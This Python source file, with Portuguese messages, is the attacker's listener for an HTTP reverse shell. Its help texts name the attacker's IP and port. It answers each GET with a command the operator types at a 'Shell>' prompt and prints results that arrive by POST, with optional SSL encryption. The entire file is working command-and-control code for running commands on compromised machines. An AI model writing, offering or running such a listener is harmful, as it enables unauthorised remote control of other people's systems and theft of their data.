import http.server
import argparse as ap

def connection(host, port, enc):
    try:
        server_class = http.server.HTTPServer
        httpd = server_class((host, port), MyHandler)

        if enc:
            import ssl
            context = ssl.SSLContext()
            context.check_hostname = False
            context.load_cert_chain('cert.pem', 'key.pem')
            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    except Exception as e:
        print('Não foi possível levantar o servidor')
        raise e

    try:
        print('Servidor está funcional. Aguardando conexões...')
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('Servidor terminado.')
        httpd.server_close()
    except ConnectionError as e:
        raise e('Mensagem personalzada de erro de conexão.')


class MyHandler(http.server.BaseHTTPRequestHandler):
    
    def do_GET(request):
        command = input('Shell> ')
        request.send_response(200)
        request.send_header('Content-Type', 'text/html')
        request.end_headers()
        request.wfile.write(command.encode('latin'))

    
    def do_POST(request):
        request.send_response(200)
        request.end_headers()
        length = int(request.headers['Content-Length'])
        postVar = request.rfile.read(length)
        print(postVar.decode('latin'))


if __name__ == '__main__':
    parser = ap.ArgumentParser()

    parser.add_argument('-i', '--ip', help='O endereço IP do atacante.', required=True)
    parser.add_argument('-p', '--port', help='A porta do atacante.', required=True, type=int)
    parser.add_argument('-s', '--ssl', help='Use esta opção caso queira criptografar a conexão.', action='store_true')

    args = parser.parse_args()

    connection(args.ip, args.port, args.ssl)
